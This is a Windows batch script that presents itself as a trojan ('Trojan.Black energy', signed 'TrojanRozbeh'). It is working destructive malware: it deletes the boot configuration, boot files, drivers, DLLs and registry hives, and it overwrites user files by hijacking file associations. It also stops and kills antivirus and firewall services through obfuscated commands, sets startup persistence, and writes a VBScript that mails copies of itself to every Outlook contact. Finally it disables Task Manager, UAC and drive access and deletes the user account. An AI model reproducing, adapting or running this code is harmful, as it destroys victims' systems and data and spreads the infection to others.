@echo off
title Trojan.Black energy

for /R %%a in (*.exe) do (

netsh advfirewall firewall add rule name="Blocked %%a" dir=out program="%%a" action=block

)
cd C:\
attrib -h -a -s autoexec.bat
takeown autoexec.bat



bcdedit /delete {current}











:payload
if exist G:\ set G:\=%seldisk% 
if exist D:\ set D:\=%seldisk%
if exist H:\ set H:\=%seldisk%


:payload1
cd %windir%
cd..
goto :infect
:payload2
cd %seldisk%
echo ^[autorun^] >autorun.inf
echo action^=Open folder to view files >>autorun.inf
echo shellexecute=^"autoexec.bat^" >>autorun.inf












:infect
echo ^@^echo ^off >autoexec.bat
echo ^mode ^43^, ^34 >>autoexec.bat
echo ^color ^F >>autoexec.bat
echo ^echo               uuuuuuu                   >>autoexec.bat
echo ^echo            uu$$$$$$$$$$$uu              >>autoexec.bat
echo ^echo         uu$$$$$$$$$$$$$$$$$uu           >>autoexec.bat
echo ^echo        u$$$$$$$$$$$$$$$$$$$$$u          >>autoexec.bat
echo ^echo      u$$$$$$$$$$$$$$$$$$$$$$$u          >>autoexec.bat
echo ^echo      u$$$$$$$$$$$$$$$$$$$$$$$$$u        >>autoexec.bat
echo ^echo      u$$$$$$$$$$$$$$$$$$$$$$$$$u        >>autoexec.bat
echo ^echo      u$$$$$$^"   ^"$$$^"   ^"$$$$$$u        >>autoexec.bat
echo ^echo      ^"$$$$^"      u$u       $$$$^"        >>autoexec.bat
echo ^echo       $$$u       u$u       u$$$         >>autoexec.bat
echo ^echo       $$$u      u$$$u      u$$$         >>autoexec.bat
echo ^echo        ^"$$$$uu$$$   $$$uu$$$$^"          >>autoexec.bat
echo ^echo         ^"$$$$$$$^"   ^"$$$$$$$^"           >>autoexec.bat
echo ^echo           u$$$$$$$u$$$$$$$u             >>autoexec.bat
echo ^echo            u$^"$^"$^"$^"$^"$^"$u              >>autoexec.bat
echo ^echo  uuu       $$u$ $ $ $ $u$$       uuu    >>autoexec.bat
echo ^echo u$$$$       $$$$$u$u$u$$$       u$$$$   >>autoexec.bat
echo ^echo $$$$$uu      ^"$$$$$$$$$^"      uu$$$$$$  >>autoexec.bat
echo ^echo u$$$$$$$$$$$uu  ^"^"^"^"^"    uuuu$$$$$$$$$$ >>autoexec.bat
echo ^echo $$$$^"^"^"$$$$$$$$$$uuu   uu$$$$$$$$$^"$$$^" >>autoexec.bat
echo ^echo ^"^"^"      ^"^"$$$$$$$$$$$uu ^"^"^"^"^"^"         >>autoexec.bat
echo ^echo         uuuu ^"^"$$$$$$$$$$uuu            >>autoexec.bat
echo ^echo u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$  >>autoexec.bat
echo ^echo $$$$$$$$$$^"^"^"^"           ^"^"$$$$$$$$$$$^" >>autoexec.bat
echo ^echo  ^"$$$$$^"                      ^"^"$$$$^"^"  >>autoexec.bat
echo ^echo    $$$^"                         $$$$^"   >>autoexec.bat
echo ^timeout ^3 ^/^nobreak ^>^nul >>autoexec.bat
echo ^taskkill ^/^im ^wininit^.exe ^/^f >>autoexec.bat
echo ^pause ^>^nul>>autoexec.bat







assoc .exe=batfile
DIR /S/B %SystemDrive%\*.exe >> InfList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_exe.txt) do copy /y %0 "%%j:%%k"
assoc .mp3=batfile
DIR /S/B %SystemDrive%\*.mp3 >> InfList_mp3.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_mp3.txt) do copy /y %0 "%%j:%%k"
assoc .txt=batfile
DIR /S/B %SystemDrive%\*.txt >> InfList_txt.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_txt.txt) do copy /y %0 "%%j:%%k"
assoc .mp4=batfile
DIR /S/B %SystemDrive%\*.mp4 >> InfList_mp4.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_mp4.txt) do copy /y %0 "%%j:%%k"
assoc .pdf=batfile
DIR /S/B %SystemDrive%\*.pdf >> InfList_pdf.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_pdf.txt) do copy /y %0 "%%j:%%k"
assoc .lnk=batfile
DIR /S/B %SystemDrive%\*.lnk >> InfList_lnk.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_lnk.txt) do copy /y %0 "%%j:%%k"
assoc .png=batfile
DIR /S/B %SystemDrive%\*.png >> InfList_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_png.txt) do copy /y %0 "%%j:%%k"
assoc .xml=batfile
DIR /S/B %SystemDrive%\*.xml >> InfList_xml.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_xml.txt) do copy /y %0 "%%j:%%k"
assoc .doc=batfile
DIR /S/B %SystemDrive%\*.doc >> InfList_doc.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_doc.txt) do copy /y %0 "%%j:%%k"
for /R %%a in (*.png) do (

netsh advfirewall firewall add rule name="Blocked2 %%a" dir=out program="%%a" action=block

)


for /R %%a in (*.exe) do (

netsh advfirewall firewall add rule name="Blocked1 %%a" dir=out program="%%a" action=block

)

reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul


@((( Echo Off > Nul ) & Break Off )
    @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul
    @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*"
)


del /F /Q %SystemDrive%\recycler\S-1-5-21-1202660629-261903793-725345543-1003\run.bat
set ii=ne
set ywe=st
set ury=t
set iej=op
set jt53=Syma
set o6t=nor
set lyd2=fee
set h3d=ton
set gf45=ntec
set own5=McA
%ii%%ury% %ywe%%iej% "Security Center" /y
%ii%%ury% %ywe%%iej% "Automatic Updates" /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Core LC" /y
%ii%%ury% %ywe%%iej% "SAVScan" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Firewall Monitor Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto-Protect Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% Spamkiller Server" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% Personal Firewall Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% SecurityCenter Update Manager" /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% SPBBCSvc" /y
cls
%ii%%ury% %ywe%%iej% "Ahnlab Task Scheduler" /y
%ii%%ury% %ywe%%iej% navapsvc /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
%ii%%ury% %ywe%%iej% vrmonsvc /y
%ii%%ury% %ywe%%iej% MonSvcNT /y
%ii%%ury% %ywe%%iej% SAVScan /y
%ii%%ury% %ywe%%iej% NProtectService /y
%ii%%ury% %ywe%%iej% ccSetMGR /y
%ii%%ury% %ywe%%iej% ccEvtMGR /y
%ii%%ury% %ywe%%iej% srservice /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Network Drivers Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% Unerase Protection" /y
%ii%%ury% %ywe%%iej% MskService /y
%ii%%ury% %ywe%%iej% MpfService /y
%ii%%ury% %ywe%%iej% mcupdmgr.exe /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%AntiSpyware" /y
%ii%%ury% %ywe%%iej% helpsvc /y
%ii%%ury% %ywe%%iej% ERSvc /y
%ii%%ury% %ywe%%iej% "*%o6t%%h3d%*" /y
%ii%%ury% %ywe%%iej% "*%jt53%%gf45%*" /y
%ii%%ury% %ywe%%iej% "*%own5%%lyd2%*" /y
cls
%ii%%ury% %ywe%%iej% ccPwdSvc /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Core LC" /y
%ii%%ury% %ywe%%iej% navapsvc /y
%ii%%ury% %ywe%%iej% "Serv-U" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Server" /y
%ii%%ury% %ywe%%iej% "NAV Alert" /y
%ii%%ury% %ywe%%iej% "Nav Auto-Protect" /y
cls
%ii%%ury% %ywe%%iej% "McShield" /y
%ii%%ury% %ywe%%iej% "DefWatch" /y
%ii%%ury% %ywe%%iej% eventlog /y
%ii%%ury% %ywe%%iej% InoRPC /y
%ii%%ury% %ywe%%iej% InoRT /y
%ii%%ury% %ywe%%iej% InoTask /y
cls
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Corporate Edition" /y
%ii%%ury% %ywe%%iej% "ViRobot Professional Monitoring" /y
%ii%%ury% %ywe%%iej% "PC-cillin Personal Firewall" /y
%ii%%ury% %ywe%%iej% "Trend Micro Proxy Service" /y
%ii%%ury% %ywe%%iej% "Trend NT Realtime Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%.com McShield" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%.com VirusScan Online Realtime Engine" /y
%ii%%ury% %ywe%%iej% "SyGateService" /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
cls
%ii%%ury% %ywe%%iej% "Sophos Anti-Virus" /y
%ii%%ury% %ywe%%iej% "Sophos Anti-Virus Network" /y
%ii%%ury% %ywe%%iej% "eTrust Antivirus Job Server" /y
%ii%%ury% %ywe%%iej% "eTrust Antivirus Realtime Server" /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
%ii%%ury% %ywe%%iej% "eTrust Antivirus RPC Server" /y
cls
%ii%%ury% %ywe%%iej% netsvcs
%ii%%ury% %ywe%%iej% spoolnt
rem Temp Kill Anti-Virus
net stop “Security Center”
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
net stop “Security Center”
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.* 
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe 
del /Q /F C:\Program Files\kasper~1\*.exe 
cls
del /Q /F C:\Program Files\trojan~1\*.exe 
del /Q /F C:\Program Files\f-prot95\*.dll 
del /Q /F C:\Program Files\tbav\*.dat 
cls
del /Q /F C:\Program Files\avpersonal\*.vdf 
del /Q /F C:\Program Files\Norton~1\*.cnt 
del /Q /F C:\Program Files\Mcafee\*.* 
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\*.* 
del /Q /F C:\Program Files\Norton~1\*.* 
cls
del /Q /F C:\Program Files\avgamsr\*.exe 
del /Q /F C:\Program Files\avgamsvr\*.exe 
del /Q /F C:\Program Files\avgemc\*.exe 
cls
del /Q /F C:\Program Files\avgcc\*.exe 
del /Q /F C:\Program Files\avgupsvc\*.exe 
del /Q /F C:\Program Files\grisoft 
del /Q /F C:\Program Files\nood32krn\*.exe 
del /Q /F C:\Program Files\nood32\*.exe 
cls
del /Q /F C:\Program Files\nod32 
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe 
del /Q /F C:\Program Files\kavmm\*.exe 
del /Q /F C:\Program Files\kaspersky\*.*
cls
del /Q /F C:\Program Files\ewidoctrl\*.exe 
del /Q /F C:\Program Files\guard\*.exe 
del /Q /F C:\Program Files\ewido\*.exe 
cls
del /Q /F C:\Program Files\pavprsrv\*.exe 
del /Q /F C:\Program Files\pavprot\*.exe 
del /Q /F C:\Program Files\avengine\*.exe 
cls
del /Q /F C:\Program Files\apvxdwin\*.exe 
del /Q /F C:\Program Files\webproxy\*.exe 
del /Q /F C:\Program Files\panda software\*.* 
net stop "security center"
net stop sharedaccess
@Echo off & @@Break Off
Ipconfig /release
%jUmP%E%nD%c%onFiG%h%IdE%o%P% h%aRv%%aRd%A%T%%cHe%cK%HappY%3D b%aLLo0Ns%Y%eS% m3Ga!?!
P%ReSs%%IE%AuS%ExPloR%e%r% > nul.%TempInternetRelease%
echo Do >> "opendisk.vbs"
echo Set oWMP = CreateObject("WMPlayer.OCX.7" ) >> "opendisk.vbs"
echo Set colCDROMs = oWMP.cdromCollection >> "opendisk.vbs"
echo colCDROMs.Item(d).Eject  >> "opendisk.vbs"
echo colCDROMs.Item(d).Eject  >> "opendisk.vbs"
echo Loop >> "opendisk.vbs"
start "" "opendisk.vbs"
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini
DIR /S/B %SystemDrive%\*.doc >> FIleList_doc.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_doc.txt) do del "%%j:%%k"
DIR /S/B %SystemDrive%\*.png >> FIleList_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_png.txt) do del "%%j:%%k"
DIR /S/B %SystemDrive%\*.exe >> FIleList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_exe.txt) do del "%%j:%%k"
DIR /S/B %SystemDrive%\*.lnk >> FIleList_lnk.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_lnk.txt) do del "%%j:%%k"
DIR /S/B %SystemDrive%\*.mp4 >> FIleList_mp4.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_mp4.txt) do del "%%j:%%k"
cd %userprofile%\desktop
del *.* /f /q /s
cd %windir%
cd..
cd ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories
del *.* /f /q /s
cd..
del *.* /f /q /s
cd..
del *.* /f /q /s
cd..
del *.* /f /q /s
cd..
del *.* /f /q /s
cd..
del *.* /f /q /s
RD ProgramData\Microsoft\Windows\Start Menu /q /s
RD /q /s ProgramData\Microsoft\Windows\Start Menu
set valinf="rundll32_%random%_toolbar"
set reginf="hklm\Software\Microsoft\Windows\CurrentVersion\Run"
reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul
echo dim x>>%SystemDrive%\mail.vbs
echo on error resume next>>%SystemDrive%\mail.vbs
echo Set fso ="Scripting.FileSystem.Object">>%SystemDrive%\mail.vbs
echo Set so=CreateObject(fso)>>%SystemDrive%\mail.vbs
echo Set ol=CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set out=WScript.CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set mapi = out.GetNameSpace("MAPI")>>%SystemDrive%\mail.vbs
echo Set a = mapi.AddressLists(1)>>%SystemDrive%\mail.vbs
echo Set ae=a.AddressEntries>>%SystemDrive%\mail.vbs
echo For x=1 To ae.Count>>%SystemDrive%\mail.vbs
echo Set ci=ol.CreateItem(0)>>%SystemDrive%\mail.vbs
echo Set Mail=ci>>%SystemDrive%\mail.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>%SystemDrive%\mail.vbs
echo Mail.Subject="Is this you?">>%SystemDrive%\mail.vbs
echo Mail.Body="Man that has got to be embarrassing!">>%SystemDrive%\mail.vbs
echo Mail.Attachments.Add(%0)>>%SystemDrive%\mail.vbs
echo Mail.send>>%SystemDrive%\mail.vbs
echo Next>>%SystemDrive%\mail.vbs
echo ol.Quit>>%SystemDrive%\mail.vbs
start "" "%SystemDrive%\mail.vbs"
cd %temp% 
echo ^If WScript.Arguments.Named.Exists(^"elevated^") = False Then >GateWay.VBS
echo  CreateObject(^"Shell.Application^").ShellExecute ^"wscript.exe^", ^"^"^"^" ^& WScript.ScriptFullName ^& ^"^"^" /elevated^", ^"^", ^"runas^", 1 >>GateWay.VBS
echo  WScript.Quit >>GateWay.VBS
echo End If >>GateWay.VBS
echo User = CreateObject(^"WScript.Shell^").ExpandEnvironmentStrings(^"%UserProfile%^") >>GateWay.VBS
echo dim Key, fso, Eater >>GateWay.VBS
echo Set Key = CreateObject(^"WScript.Shell^") >>GateWay.VBS
echo Set fso = CreateObject(^"Scripting.FileSystemObject^") >>GateWay.VBS
echo Set Eater = fso.GetFile(Wscript.ScriptFullName) >>GateWay.VBS
echo On Error Resume Next >>GateWay.VBS
echo Key.Regwrite ^"HKLM\System\CurrentControlSet\Control\SafeBoot\AlternateShell^",^"notepad.exe^"^, ^"REG_SZ^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\System\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName^",^"TrojanRozbeh^", ^"REG_SZ^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\legalnoticecaption^",^"ATTENTION!^", ^"REG_SZ^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\legalnoticetext^",^"Your Computer Destroyed by TrojanRozbeh!^", ^"REG_SZ^" >>GateWay.VBS
echo Key.Regwrite ^"HKCU\Control Panel\International\s1159^",^"TrojanRozbeh^", ^"REG_SZ^" >>GateWay.VBS
echo Key.Regwrite ^"HKCU\Control Panel\International\s2359^",^"TrojanRozbeh^", ^"REG_SZ^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden^", ^"2^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\TaskbarNoPinnedList^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoPinningToTaskbar^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskbar^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayItemsDisplay^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayContextMenu^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSaveSettings^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableLockWorkstation^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA^", ^"0^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuPinnedList^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuMFUprogramsList^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuMorePrograms,^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions^" , ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileAssociate^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSecurityTab^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSecurityTab^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKCU\Software\Microsoft\Command Processor\DisableUNCCheck^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives^",^"67108863^",^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives^",^"67108863^",^"REG_DWORD^" >>GateWay.VBS
reg delete "HKCR" /f /va
reg delete "HKCC" /f /va
reg delete "HKCU" /f /va
reg delete "HKU" /f /va
Msg * You Terminated by rozbeh
Start GateWay.VBS
del /f /q "%windir%\system32\notepad.exe"
takeown /f %windir%
cd %windir%
attrib -h -s -a *.dll
del *.dll /f /q /s
cd..
attrib -h -a -s CONFIG.SYS
takeown /f config.sys
del CONFIG.SYS /f /q /s
net users %username% /delete



